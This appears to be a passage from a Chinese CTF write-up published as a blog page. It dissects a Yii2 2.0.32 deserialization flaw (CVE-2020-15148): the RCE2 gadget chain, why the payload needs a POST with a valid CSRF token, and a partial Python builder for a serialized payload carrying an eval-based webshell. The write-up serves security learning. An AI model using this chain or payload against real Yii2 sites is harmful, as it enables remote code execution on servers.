@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><!-- Run before styles and content so the saved theme is applied on first paint. --><script>
+  (() => {
+    let saved = null;
+    try {
+      saved = window.localStorage.getItem('theme');
+    } catch {
+      // Storage may be blocked; the system preference still works.
+    }
+    const theme = saved === 'dark' || saved === 'light'
+      ? saved
+      : window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    document.documentElement.dataset.theme = theme;
+    document.documentElement.classList.add('js');
+
+    // Set the client configuration before the asynchronous Giscus script runs.
+    const updateGiscusScripts = () => {
+      document.querySelectorAll('script[src="https://giscus.app/client.js"]').forEach((script) => {
+        script.setAttribute('data-theme', document.documentElement.dataset.theme || theme);
+      });
+    };
+    const observer = new MutationObserver(updateGiscusScripts);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+    document.addEventListener('DOMContentLoaded', () => {
+      updateGiscusScripts();
+      observer.disconnect();
+    }, { once: true });
+  })();
+</script><meta name="description" content="Yii 2.0.32 的 about 入口直接 unserialize，用 phpggc 的 Yii2/RCE2 链拿到 eval；再靠 session 激活时机和 mod_cgi 绕过 disable_functions 读 /flag。"><meta name="author" content="yyg"><meta name="theme-color" content="#f5f7fa" media="(prefers-color-scheme: light)"><meta name="theme-color" content="#10161d" media="(prefers-color-scheme: dark)"><meta property="og:site_name" content="yyg"><meta property="og:title" content="CTF Web 进阶三题（一）—— Yii2 反序列化：红帽杯 2021 framework · yyg"><meta property="og:description" content="Yii 2.0.32 的 about 入口直接 unserialize，用 phpggc 的 Yii2/RCE2 链拿到 eval；再靠 session 激活时机和 mod_cgi 绕过 disable_functions 读 /flag。"><meta property="og:image" content="https://yangpeter26-bot.github.io/avatar-yyg.jpg"><meta property="og:image:alt" content="yyg 的头像"><meta property="og:url" content="https://yangpeter26-bot.github.io/posts/ctf-web-advanced-1-yii2/"><meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2026-10-25"><meta name="twitter:card" content="summary"><title>CTF Web 进阶三题（一）—— Yii2 反序列化：红帽杯 2021 framework · yyg</title><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://yangpeter26-bot.github.io/posts/ctf-web-advanced-1-yii2/"><link rel="alternate" type="application/rss+xml" title="yyg RSS" href="https://yangpeter26-bot.github.io/rss.xml"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CTF Web 进阶三题（一）—— Yii2 反序列化：红帽杯 2021 framework","datePublished":"2026-10-25","keywords":"Security, CTF, Web","author":{"@type":"Person","name":"yyg","url":"https://yangpeter26-bot.github.io/posts/about/"},"description":"Yii 2.0.32 的 about 入口直接 unserialize，用 phpggc 的 Yii2/RCE2 链拿到 eval；再靠 session 激活时机和 mod_cgi 绕过 disable_functions 读 /flag。","url":"https://yangpeter26-bot.github.io/posts/ctf-web-advanced-1-yii2/","image":"https://yangpeter26-bot.github.io/avatar-yyg.jpg","inLanguage":"zh-CN"}</script><link rel="stylesheet" href="/_astro/archive.RteHTq5J.css">
+<link rel="stylesheet" href="/_astro/_slug_.BrXo20_Y.css"></head> <body data-astro-cid-sckkx6r4> <a class="skip-link" href="#main-content" data-astro-cid-sckkx6r4>跳到正文</a> <header class="site-header" data-astro-cid-3ef6ksr2> <nav class="navigation glass" aria-label="主导航" data-astro-cid-3ef6ksr2> <a href="/" class="brand" aria-label="yyg，返回首页" data-astro-cid-3ef6ksr2> <span class="brand-mark" aria-hidden="true" data-astro-cid-3ef6ksr2>y</span><span data-astro-cid-3ef6ksr2>yyg</span> </a> <ul class="desktop-links" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页</a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言</a></li> </ul> <div class="nav-actions" data-astro-cid-3ef6ksr2> <button type="button" class="nav-action search-trigger" aria-label="搜索文章" aria-haspopup="dialog" aria-controls="search-dialog" data-search-open data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-3ef6ksr2></circle><path d="m16 16 4.5 4.5" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action theme-button" id="theme-toggle" aria-label="切换深色主题" aria-pressed="false" data-astro-cid-3ef6ksr2> <svg class="icon-moon" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path d="M20.5 13.5A8.5 8.5 0 0 1 10.5 3.5a8.5 8.5 0 1 0 10 10Z" data-astro-cid-3ef6ksr2></path></svg> <svg class="icon-sun" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="12" cy="12" r="4" data-astro-cid-3ef6ksr2></circle><path d="M12 2v2m0 16v2M2 12h2m16 0h2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4m0-14.2-1.4 1.4M6.3 17.7l-1.4 1.4" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action menu-toggle" id="hamburger" aria-label="展开导航" aria-controls="mobile-menu" aria-expanded="false" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path class="menu-line-top" d="M5 8h14" data-astro-cid-3ef6ksr2></path><path class="menu-line-bottom" d="M5 16h14" data-astro-cid-3ef6ksr2></path></svg> </button> </div> <ul class="mobile-navigation glass" id="mobile-menu" hidden data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li> </ul> </nav> </header>  <main id="main-content" class="container page-main page-main--wide" tabindex="-1" data-astro-cid-sckkx6r4>  <div class="reading-progress" aria-hidden="true" data-astro-cid-gysqo7gh><span data-reading-progress data-astro-cid-gysqo7gh></span></div> <div class="reading-shell" data-astro-cid-gysqo7gh> <article class="article-panel surface" id="article-top" data-reading-article data-astro-cid-gysqo7gh> <header class="article-header" data-astro-cid-gysqo7gh> <nav class="article-breadcrumb" aria-label="当前位置" data-astro-cid-gysqo7gh> <a href="/" data-astro-cid-gysqo7gh>首页</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span> <a href="/archive/" data-astro-cid-gysqo7gh>文章</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span><a href="/series/#ctf-web-advanced" data-astro-cid-gysqo7gh>CTF Web 进阶三题</a> </nav> <p class="article-series-label" data-astro-cid-gysqo7gh>CTF Web 进阶三题 <span data-astro-cid-gysqo7gh>· 第 1 / 3 篇</span></p> <h1 class="article-title" data-astro-cid-gysqo7gh>CTF Web 进阶三题（一）—— Yii2 反序列化：红帽杯 2021 framework</h1> <p class="article-summary" data-astro-cid-gysqo7gh>Yii 2.0.32 的 about 入口直接 unserialize，用 phpggc 的 Yii2/RCE2 链拿到 eval；再靠 session 激活时机和 mod_cgi 绕过 disable_functions 读 /flag。</p> <div class="article-meta" data-astro-cid-gysqo7gh> <time datetime="2026-10-25" data-astro-cid-gysqo7gh>2026年10月25日</time> <span class="meta-separator" aria-hidden="true" data-astro-cid-gysqo7gh></span> <span data-astro-cid-gysqo7gh>约 7 分钟读完</span> </div> <ul class="article-tags" aria-label="文章标签" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh><a href="/tags/Security/" data-astro-cid-gysqo7gh>Security</a></li><li data-astro-cid-gysqo7gh><a href="/tags/CTF/" data-astro-cid-gysqo7gh>CTF</a></li><li data-astro-cid-gysqo7gh><a href="/tags/Web/" data-astro-cid-gysqo7gh>Web</a></li> </ul> </header> <details class="mobile-toc" data-mobile-toc data-astro-cid-gysqo7gh> <summary data-astro-cid-gysqo7gh><span data-astro-cid-gysqo7gh>文章目录</span><span class="toc-count" data-astro-cid-gysqo7gh>17 个小节</span></summary> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一题目长什么样" data-toc-link data-astro-cid-gysqo7gh>一、题目长什么样</a> </li><li data-astro-cid-gysqo7gh> <a href="#二入口about-里的-unserialize" data-toc-link data-astro-cid-gysqo7gh>二、入口：about 里的 unserialize</a> </li><li data-astro-cid-gysqo7gh> <a href="#三cve-2020-15148" data-toc-link data-astro-cid-gysqo7gh>三、CVE-2020-15148</a> </li><li data-astro-cid-gysqo7gh> <a href="#四链条拆解rce2" data-toc-link data-astro-cid-gysqo7gh>四、链条拆解（RCE2）</a> </li><li data-astro-cid-gysqo7gh> <a href="#五为什么-get-打不通session-必须已激活" data-toc-link data-astro-cid-gysqo7gh>五、为什么 GET 打不通：session 必须已激活</a> </li><li data-astro-cid-gysqo7gh> <a href="#六手工构造-vs-phpggc" data-toc-link data-astro-cid-gysqo7gh>六、手工构造 vs phpggc</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#61-手工序列化理解用" data-toc-link data-astro-cid-gysqo7gh>6.1 手工序列化（理解用）</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#62-phpggc生产用" data-toc-link data-astro-cid-gysqo7gh>6.2 phpggc（生产用）</a> </li><li data-astro-cid-gysqo7gh> <a href="#七从-eval-到-flag" data-toc-link data-astro-cid-gysqo7gh>七、从 eval 到 flag</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#71-先看环境" data-toc-link data-astro-cid-gysqo7gh>7.1 先看环境</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#72-反射查看被禁函数" data-toc-link data-astro-cid-gysqo7gh>7.2 反射查看被禁函数</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#73-flag-在哪" data-toc-link data-astro-cid-gysqo7gh>7.3 flag 在哪</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#74-用-mod_cgi-把命令跑起来" data-toc-link data-astro-cid-gysqo7gh>7.4 用 mod_cgi 把命令跑起来</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩过的坑按时间顺序" data-toc-link data-astro-cid-gysqo7gh>八、踩过的坑（按时间顺序）</a> </li><li data-astro-cid-gysqo7gh> <a href="#九完整操作序列" data-toc-link data-astro-cid-gysqo7gh>九、完整操作序列</a> </li><li data-astro-cid-gysqo7gh> <a href="#十检查清单下次遇到框架反序列化" data-toc-link data-astro-cid-gysqo7gh>十、检查清单（下次遇到框架反序列化）</a> </li><li data-astro-cid-gysqo7gh> <a href="#相关" data-toc-link data-astro-cid-gysqo7gh>相关</a> </li> </ol> </nav> </details> <div class="reading-content prose" id="article-content" data-reading-content data-astro-cid-gysqo7gh> <blockquote>
+<p>题目：CTFHub 历年真题 · 2021 第四届红帽杯网络安全大赛 · Web · framework
+环境：Yii 2.0.32 / PHP 7.4.5 / Apache + mod_php
+考点：CVE-2020-15148 反序列化链、<code>phpggc</code>、session 时机、mod_cgi 绕过 disable_functions</p>
+</blockquote>
+<hr>
+<h2 id="一题目长什么样">一、题目长什么样</h2>
+<p>附件是一个完整的 Yii2 应用（<code>1166_5dac...zip</code>），解压后是标准的 <code>basic</code> 模板：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>config/web.php</span></span>
+<span class="line"><span>controllers/SiteController.php</span></span>
+<span class="line"><span>models/User.php</span></span>
+<span class="line"><span>views/site/about.php</span></span>
+<span class="line"><span>web/index.php</span></span>
+<span class="line"><span>vendor/yiisoft/yii2/        # 2.0.32</span></span></code></pre>
+<p><code>web/index.php</code> 里有两行值得注意：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#89B4FA;font-style:italic">defined</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'YII_DEBUG'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> or</span><span style="color:#89B4FA;font-style:italic"> define</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'YII_DEBUG'</span><span style="color:#9399B2">,</span><span style="color:#CBA6F7"> true</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">defined</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'YII_ENV'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> or</span><span style="color:#89B4FA;font-style:italic"> define</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'YII_ENV'</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'dev'</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">system</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'watch chmod -R +x *'</span><span style="color:#9399B2">);</span><span style="color:#9399B2;font-style:italic">   // 出题人留的，和解题关系不大</span></span></code></pre>
+<p><code>config/web.php</code> 里 <code>debug</code> 和 <code>gii</code> 两个模块在 dev 下是开的，<code>cookieValidationKey => 'asdasd'</code>。</p>
+<h2 id="二入口about-里的-unserialize">二、入口：about 里的 unserialize</h2>
+<p><code>controllers/SiteController.php</code>：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#CBA6F7">public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> actionAbout</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">message </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> '</span><span style="color:#A6E3A1;font-style:italic">Hello</span><span style="color:#A6E3A1">'</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2"> (</span><span style="color:#F9E2AF;font-style:italic">Yii</span><span style="color:#94E2D5">::</span><span style="color:#CDD6F4">$app</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">request</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">isPost</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">        // ...</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#CDD6F4">    $data </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> base64_decode</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$message</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">    unserialize</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$data</span><span style="color:#9399B2">);</span><span style="color:#9399B2;font-style:italic">          // ← line 114，sink 在这里</span></span>
+<span class="line"><span style="color:#CBA6F7">    return</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">render</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'about'</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> [</span><span style="color:#A6E3A1">'message'</span><span style="color:#94E2D5"> =></span><span style="color:#CDD6F4"> $message</span><span style="color:#9399B2">]);</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span></code></pre>
+<p><code>$message</code> 来自请求参数，<code>base64_decode</code> 后直接 <code>unserialize</code>，没有任何限制。</p>
+<p><strong>分诊结论</strong>：有源码 + 有 <code>unserialize</code> + 框架版本 2.0.32 → 先查这个版本的已知反序列化链，不要手搓。</p>
+<h2 id="三cve-2020-15148">三、CVE-2020-15148</h2>
+<p>Yii2 <code>&#x3C; 2.0.38</code> 的已知反序列化漏洞。官方通告的说法是「<code>BatchQueryResult</code> 的 <code>__destruct</code> 会调用外部传入对象的 <code>close()</code>」，配合 <code>DbSession</code> / <code>IndexAction</code> 等类可以拼出 RCE。</p>
+<p><code>phpggc</code> 里对应两条链：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>链</th><th>原语</th><th>用到的回调</th></tr></thead><tbody><tr><td><code>Yii2/RCE1</code></td><td>调用<strong>一个函数</strong></td><td><code>IndexAction::run()</code> → <code>call_user_func($checkAccess, $id)</code></td></tr><tr><td><code>Yii2/RCE2</code></td><td><strong>任意 PHP 代码</strong></td><td><code>ExpressionDependency::evaluateDependency()</code> → <code>eval()</code></td></tr></tbody></table>
+<p>能做 RCE2 就一定要用 RCE2：RCE1 只能调一个函数，遇到 <code>disable_functions</code> 很容易卡死（这题就是）。</p>
+<h2 id="四链条拆解rce2">四、链条拆解（RCE2）</h2>
+<p>用 Yii 2.0.32 的源码逐行看（路径相对 <code>vendor/yiisoft/yii2/</code>）：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>BatchQueryResult::__destruct()                 db/BatchQueryResult.php:79</span></span>
+<span class="line"><span>  └─ reset()                                   db/BatchQueryResult.php:89</span></span>
+<span class="line"><span>       └─ $this->_dataReader->close()          db/BatchQueryResult.php:92</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>yii\web\DbSession::close()                     web/DbSession.php:149</span></span>
+<span class="line"><span>  ├─ if ($this->getIsActive())                 web/Session.php:220</span></span>
+<span class="line"><span>  └─ $this->fields = $this->composeFields()    web/DbSession.php:153</span></span>
+<span class="line"><span>       └─ call_user_func($this->writeCallback, $this)</span></span>
+<span class="line"><span>                                               web/MultiFieldSession.php:98</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[yii\caching\ExpressionDependency, 'evaluateDependency']</span></span>
+<span class="line"><span>  └─ evaluateDependency()                      caching/Dependency.php:47</span></span>
+<span class="line"><span>       └─ generateDependencyData()             caching/ExpressionDependency.php:46</span></span>
+<span class="line"><span>            └─ eval("return {$this->expression};")</span></span></code></pre>
+<p>关键源码（照抄，方便以后对照）：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#9399B2;font-style:italic">// db/BatchQueryResult.php:89</span></span>
+<span class="line"><span style="color:#CBA6F7">public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> reset</span><span style="color:#9399B2">()</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2"> (</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">_dataReader </span><span style="color:#94E2D5">!==</span><span style="color:#CBA6F7"> null</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#F38BA8">        $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">_dataReader</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">close</span><span style="color:#9399B2">();</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#94E2D5">    ...</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">// web/DbSession.php:149</span></span>
+<span class="line"><span style="color:#CBA6F7">public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> close</span><span style="color:#9399B2">()</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2"> (</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">getIsActive</span><span style="color:#9399B2">())</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">        // prepare writeCallback fields before session closes</span></span>
+<span class="line"><span style="color:#F38BA8">        $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">fields </span><span style="color:#94E2D5">=</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">composeFields</span><span style="color:#9399B2">();</span></span>
+<span class="line"><span style="color:#CDD6F4">        YII_DEBUG </span><span style="color:#94E2D5">?</span><span style="color:#89B4FA;font-style:italic"> session_write_close</span><span style="color:#9399B2">()</span><span style="color:#94E2D5"> :</span><span style="color:#94E2D5"> @</span><span style="color:#89B4FA;font-style:italic">session_write_close</span><span style="color:#9399B2">();</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">// web/MultiFieldSession.php:96</span></span>
+<span class="line"><span style="color:#CBA6F7">protected</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> composeFields</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">id </span><span style="color:#94E2D5">=</span><span style="color:#CBA6F7;font-style:italic"> null</span><span style="color:#9399B2">,</span><span style="color:#EBA0AC"> $</span><span style="color:#EBA0AC;font-style:italic">data </span><span style="color:#94E2D5">=</span><span style="color:#CBA6F7;font-style:italic"> null</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CDD6F4">    $fields </span><span style="color:#94E2D5">=</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">writeCallback </span><span style="color:#94E2D5">?</span><span style="color:#89B4FA;font-style:italic"> call_user_func</span><span style="color:#9399B2">(</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">writeCallback</span><span style="color:#9399B2">,</span><span style="color:#F38BA8"> $this</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> :</span><span style="color:#9399B2"> [];</span></span>
+<span class="line"><span style="color:#94E2D5">    ...</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">// caching/ExpressionDependency.php:46</span></span>
+<span class="line"><span style="color:#CBA6F7">protected</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> generateDependencyData</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">cache</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    return</span><span style="color:#89B4FA;font-style:italic"> eval</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"return </span><span style="color:#CDD6F4">{</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">expression}</span><span style="color:#A6E3A1">;"</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span></code></pre>
+<h2 id="五为什么-get-打不通session-必须已激活">五、为什么 GET 打不通：session 必须已激活</h2>
+<p>这是这题最坑的地方，也是 wp 里没写的。</p>
+<p><code>DbSession::close()</code> 第一行是 <code>if ($this->getIsActive())</code>，而 <code>getIsActive()</code> 不是读对象自己的属性：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#9399B2;font-style:italic">// web/Session.php:220</span></span>
+<span class="line"><span style="color:#CBA6F7">public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> getIsActive</span><span style="color:#9399B2">()</span></span>
+<span class="line"><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    return</span><span style="color:#89B4FA;font-style:italic"> session_status</span><span style="color:#9399B2">()</span><span style="color:#94E2D5"> ===</span><span style="color:#CDD6F4"> PHP_SESSION_ACTIVE</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span></code></pre>
+<p>它看的是<strong>当前 PHP 进程的全局 session 状态</strong>。</p>
+<ul>
+<li>直接 GET <code>?r=site/about&#x26;message=...</code>：没有 <code>session_start()</code>，<code>session_status()</code> 是 <code>PHP_SESSION_NONE</code> → <code>close()</code> 直接返回，链子<strong>静默失效</strong>，页面看起来完全正常。</li>
+<li>POST 且带 <code>_csrf</code>：Yii 的 CSRF 校验会调用 <code>$this->getCsrfToken()</code>，进而 <code>Yii::$app->session->open()</code> → session 激活 → 链子才跑。</li>
+</ul>
+<p>所以 payload 必须走 <strong>POST + 合法 <code>_csrf</code></strong>。</p>
+<p>实测对比：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>请求方式</th><th>结果</th></tr></thead><tbody><tr><td>GET + payload</td><td>200，页面正常，无任何执行</td></tr><tr><td>POST 无 <code>_csrf</code></td><td>400 <code>Unable to verify your data submission</code></td></tr><tr><td>POST + <code>_csrf</code></td><td>eval 执行</td></tr></tbody></table>
+<h2 id="六手工构造-vs-phpggc">六、手工构造 vs phpggc</h2>
+<h3 id="61-手工序列化理解用">6.1 手工序列化（理解用）</h3>
+<p>Windows 上没有 PHP 时，可以直接用 Python 拼：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CBA6F7">def</span><span style="color:#89B4FA;font-style:italic"> s</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC;font-style:italic">v</span><span style="color:#9399B2">):</span><span style="color:#9399B2;font-style:italic">  # PHP serialize 字符串</span></span>
+<span class="line"><span style="color:#CBA6F7">    return</span><span style="color:#A6E3A1"> 's:</span><span style="color:#F5C2E7">%d</span><span style="color:#A6E3A1">:"</span><span style="color:#F5C2E7">%s</span><span style="color:#A6E3A1">";'</span><span style="color:#94E2D5"> %</span><span style="color:#9399B2"> (</span><span style="color:#FAB387;font-style:italic">len</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">v</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">encode</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'latin-1'</span><span style="color:#9399B2">)),</span><span style="color:#CDD6F4"> v</span><span style="color:#9399B2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9399B2;font-style:italic"># 私有属性 _dataReader：键名是 \0类名\0属性名</span></span>
+<span class="line"><span style="color:#CDD6F4">private </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> '</span><span style="color:#F5C2E7">\x00</span><span style="color:#A6E3A1">yii</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">db</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">BatchQueryResult</span><span style="color:#F5C2E7">\x00</span><span style="color:#A6E3A1">_dataReader'</span><span style="color:#9399B2;font-style:italic">   # 长度 36</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CDD6F4">dep </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> 'O:32:"yii</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">caching</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">ExpressionDependency":1:{'</span><span style="color:#94E2D5"> +</span><span style="color:#89B4FA"> s</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'expression'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> +</span><span style="color:#89B4FA"> s</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'eval($_REQUEST["ant"]);'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> +</span><span style="color:#A6E3A1"> '}'</span></span>
+<span class="line"><span style="color:#CDD6F4">db  </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> 'O:17:"yii</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">web</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">DbSession":1:{'</span><span style="color:#94E2D5"> +</span><span style="color:#89B4FA"> s</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'writeCallback'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> +</span><span style="color:#A6E3A1"> 'a:2:{i:0;'</span><span style="color:#94E2D5"> +</span><span style="color:#CDD6F4"> dep </span><span style="color:#94E2D5">+</span><span style="color:#A6E3A1"> 'i:1;'</span><span style="color:#94E2D5"> +</span><span style="color:#89B4FA"> s</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'evaluateDependency'</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> +</span><span style="color:#A6E3A1"> '</span><span style="color:#F5C2E7">}}</span><span style="color:#A6E3A1">'</span></span>
